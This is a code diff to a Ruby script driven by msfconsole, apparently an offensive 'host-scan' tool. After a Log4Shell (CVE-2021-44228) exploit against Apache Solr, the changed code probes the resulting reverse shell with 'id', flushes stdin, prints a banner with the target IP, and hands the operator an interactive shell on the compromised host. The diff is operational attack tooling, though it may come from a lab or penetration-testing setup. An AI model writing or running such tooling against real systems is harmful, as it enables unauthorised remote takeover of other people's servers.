@@ -522,15 +522,60 @@ if !got_session
   run_single("exit")
 else
   \$session_id = framework.sessions.keys.first
+
+  # Verify the session is actually usable before handing control to the user.
+  # Send a probe command and wait for output — this ensures the reverse shell
+  # has fully connected and the I/O channel is established.
+  puts "\033[0;35m[host-scan]\033[0m Waiting for shell session to stabilize..."
+  shell_ready = false
+  8.times do |i|
+    begin
+      sess = framework.sessions[\$session_id]
+      if sess && sess.type == "shell"
+        sess.shell_write("id\n")
+        sleep(1.5)
+        output = sess.shell_read(-1, 2) rescue ""
+        if output && output.include?("uid=")
+          shell_ready = true
+          break
+        end
+      end
+    rescue => e
+      # Session not ready yet
+    end
+    sleep(1)
+  end
+
+  unless shell_ready
+    puts "\033[0;35m[host-scan]\033[0m \033[1;33mWARNING: Shell probe timed out — session may be unstable.\033[0m"
+  end
+
+  # Flush any buffered stdin so stray keystrokes don't leak into the session.
+  # msfconsole reads from stdin, so anything typed during the exploit phase
+  # sits in the buffer and would be sent as commands to the reverse shell.
+  \$stdin.raw_no_echo_mode rescue nil
+  while IO.select([\$stdin], nil, nil, 0)
+    \$stdin.read_nonblock(4096) rescue break
+  end
+  \$stdin.restore_mode rescue nil
+
   puts ""
-  puts "\033[0;35m#{'=' * 80}\033[0m"
-  puts "\033[0;35m[host-scan]\033[0m \033[0;32mReverse shell established (session #{\$session_id})\033[0m"
-  puts "\033[0;35m#{'=' * 80}\033[0m"
+  puts "\033[0;32m#{'*' * 80}\033[0m"
+  puts "\033[0;32m*#{' ' * 78}*\033[0m"
+  puts "\033[0;32m*   REVERSE SHELL READY — session #{\$session_id}#{' ' * (36 - \$session_id.to_s.length)}*\033[0m"
+  puts "\033[0;32m*#{' ' * 78}*\033[0m"
+  puts "\033[0;32m*   Target: ${TARGET_IP}#{' ' * (63 - '${TARGET_IP}'.length)}*\033[0m"
+  puts "\033[0;32m*   Exploit: Log4Shell (CVE-2021-44228) via Solr JNDI injection     *\033[0m"
+  puts "\033[0;32m*#{' ' * 78}*\033[0m"
+  puts "\033[0;32m*   Type commands below. Use 'exit' or Ctrl+C to disconnect.         *\033[0m"
+  puts "\033[0;32m*#{' ' * 78}*\033[0m"
+  puts "\033[0;32m#{'*' * 80}\033[0m"
   puts ""
-  puts "\033[0;35m[host-scan]\033[0m RCE achieved via Log4Shell JNDI injection in Solr action parameter."
-  puts ""
-  puts "\033[0;35m[host-scan]\033[0m Dropping into interactive session. Type 'exit' or Ctrl+C to disconnect."
-  puts ""
+
+  # Gate: require explicit ENTER press so the user consciously enters the shell
+  \$stdout.write "\033[1;37m>>> Press ENTER to drop into the reverse shell... \033[0m"
+  \$stdout.flush
+  \$stdin.gets
 
   # Drop into the interactive shell session
   run_single("sessions -i #{\$session_id}")
